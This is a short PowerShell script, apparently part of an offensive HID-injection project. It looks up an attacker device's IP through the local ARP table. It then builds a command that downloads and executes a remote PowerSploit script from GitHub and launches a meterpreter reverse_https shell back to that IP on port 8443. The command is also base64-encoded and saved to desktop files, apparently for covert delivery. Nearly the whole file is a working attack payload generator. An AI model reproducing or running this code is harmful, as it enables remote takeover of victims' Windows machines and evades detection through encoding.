$Tablet = "BurnD-Sero"
$Computer = "BurnD-Machine"
try {
    $DevIP = arp -a | select-string "$Computer" |% { $_.ToString().Trim().Split(" ")[0] }
    }
catch {
    try {
        $DevIP = arp -a | select-string "$Tablet" |% { $_.ToString().Trim().Split(" ")[0] }
        }
    catch {
        EXIT
        }
    }
$url = '"https://github.com/Burnd9671/HID-Powersploit/raw/master/var/www/html/Invoke-Powersploit"'
$rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $DevIP -Lport 8443 -Force"
Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
$obfscmd = [Convert]::ToBase64String($bytes)
Echo $obfscmd > "C:\Users\Bryan Louiselle\Desktop\Obfuscated_Command.txt"
